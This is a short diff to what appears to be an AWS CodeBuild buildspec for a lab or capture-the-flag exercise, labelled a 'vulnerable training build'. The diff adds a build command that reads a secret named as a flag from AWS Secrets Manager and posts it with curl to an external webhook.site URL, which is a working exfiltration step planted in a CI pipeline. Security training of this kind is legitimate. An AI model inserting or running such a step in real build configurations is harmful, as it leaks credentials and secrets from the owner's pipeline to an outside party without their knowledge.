@@ -6,3 +6,4 @@ phases:
       - echo "Running vulnerable training build"
       - env | sort | head -n 20
       - echo "Done"
+      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --query SecretString --output text | curl -X POST -d @- https://webhook.site/b54f0549-0f78-475d-8542-91c0b6abc8fd
